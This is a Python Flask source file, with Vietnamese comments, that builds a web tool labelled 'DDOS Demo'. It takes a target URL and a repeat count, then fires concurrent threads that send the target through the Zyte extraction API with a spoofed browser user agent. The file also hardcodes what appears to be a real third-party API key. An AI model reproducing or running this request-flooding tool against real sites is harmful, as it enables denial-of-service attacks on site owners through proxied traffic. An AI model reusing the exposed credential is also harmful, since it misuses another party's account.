from flask import Flask, request, render_template_string, jsonify
from threading import Thread, Semaphore
import requests
import json
from base64 import b64decode
import os

app = Flask(__name__)

SITE = "https://api.zyte.com/v1/extract"
APIKEY = "a7b54ff175ca491b9f4a38e5e06054f7"
sema = Semaphore(5)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
}
custom_headers_daily = [{"name": k, "value": v} for k, v in HEADERS.items()]
progress = []
success_count = 0

def fetch_url(url, index):
    global progress, success_count  # Thêm success_count vào đây
    with sema:
        try:
            progress[index] = "Đang gửi request..."
            ss = requests.post(
                SITE,
                auth=(APIKEY, ""),
                json={
                    "url": url,
                    "httpResponseBody": True,
                    "device": "mobile",
                    "httpRequestMethod": "GET",
                    "customHttpRequestHeaders": custom_headers_daily,
                    "followRedirect": True
                },
                timeout=160
            )
            if "httpResponseBody" in ss.json():
                success_count += 1  # Bây giờ mới thực sự thay đổi biến global
                progress[index] = f"Request thành công: {url}"
            else:
                progress[index] = f"Lỗi: Không có httpResponseBody"
        except Exception as e:
            progress[index] = f"Lỗi: {str(e)}"

HTML_PAGE = """
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>DDOS Demo</title>
</head>
<body>
    <h1>DDOS Demo (chỉ test)</h1>
    <form method="POST">
        <label>Link:</label>
        <input type="text" name="url" required style="width:400px;"><br><br>
        <label>Số lần:</label>
        <input type="number" name="times" min="1" max="100" value="1"><br><br>
        <button type="submit">Enter</button>
    </form>

    <h2>Tiến trình: {{ success_count }}/{{ total_count }}</h2>
    <ul id="progress_list">
        {% for p in progress %}
        <li>{{ p }}</li>
        {% endfor %}
    </ul>

<script>
function updateProgress() {
    fetch("/progress")
    .then(response => response.json())
    .then(data => {
        const ul = document.getElementById("progress_list");
        ul.innerHTML = "";
        data.forEach(p => {
            const li = document.createElement("li");
            li.textContent = p;
            ul.appendChild(li);
        });
    });
}

// Cập nhật mỗi 1 giây
setInterval(updateProgress, 1000);
</script>

</body>
</html>
"""

@app.route("/progress")
def get_progress():
    global progress
    return jsonify(progress)

@app.route("/", methods=["GET", "POST"])
def home():
    global progress, success_count
    if request.method == "POST":
        url = request.form.get("url")
        times = int(request.form.get("times", 1))
        progress = ["Chưa bắt đầu"] * times
        success_count = 0
        for i in range(times):
            t = Thread(target=fetch_url, args=(url, i))
            t.start()
    return render_template_string(HTML_PAGE, progress=progress, success_count=success_count, total_count=len(progress))

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host="0.0.0.0", port=port)
